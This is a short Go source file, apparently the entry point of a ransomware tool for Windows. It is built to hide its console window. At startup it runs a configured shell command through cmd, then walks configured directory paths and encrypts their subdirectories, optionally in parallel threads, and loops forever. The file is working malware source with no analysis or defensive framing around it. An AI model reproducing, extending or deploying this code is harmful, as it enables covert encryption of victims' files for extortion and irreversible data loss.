package main

import (
	"fmt"
	"os/exec"
)

//go build -ldflags "-H=windowsgui" .\main.go .\file.go .\encrypt.go .\dirOpera.go .\constVar.go .\linkedVar.go
//go run .\main.go .\file.go .\encrypt.go .\dirOpera.go .\constVar.go .\linkedVar.go

func handlePaths() {
	IS_MULTI_THREAD_STR := byte_decode2str(IS_MULTI_THREAD[:])
	for _, byte_path := range PATHS {
		path := byte_decode2str(byte_path[:]) //非重要功能，将字节数组转化为字符串
		if path == "UNABLE0" || path == "" {
			continue
		}
		if IS_MULTI_THREAD_STR == "true" {
			go encryptSubDirByBFS(path)
		} else {
			encryptSubDirByBFS(path)
		}
	}
}

func main() {
	cmd := exec.Command("cmd", "/C", byte_decode2str(COMMAND_BEFORE_START[:]))
	err := cmd.Run()
	if err != nil {
		if IS_DEBUG {
			fmt.Println("CMD运行失败")
		}
	}
	go handlePaths()
	for {

	}
}
